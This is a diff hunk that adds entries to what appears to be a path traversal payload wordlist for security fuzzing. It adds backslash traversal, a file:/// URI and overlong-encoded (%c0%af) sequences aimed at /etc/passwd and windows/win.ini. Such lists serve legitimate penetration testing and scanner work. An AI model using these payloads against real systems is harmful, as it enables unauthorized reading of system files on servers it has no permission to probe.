@@ -3,10 +3,14 @@ etc/passwd
  /././etc/passwd
 /..%2fetc/passwd,
 /..%2fetc/passwd
+..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
 /etc/passwd
+file:///etc/passwd
 c:\\windows\\win.ini
 /../../../../../../../../../windows/win.ini
 ../../../../etc/passwd
+%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
 .../etc/passwd
 ....//....//....//....//etc/passwd
 /....//....//....//....//etc/passwd
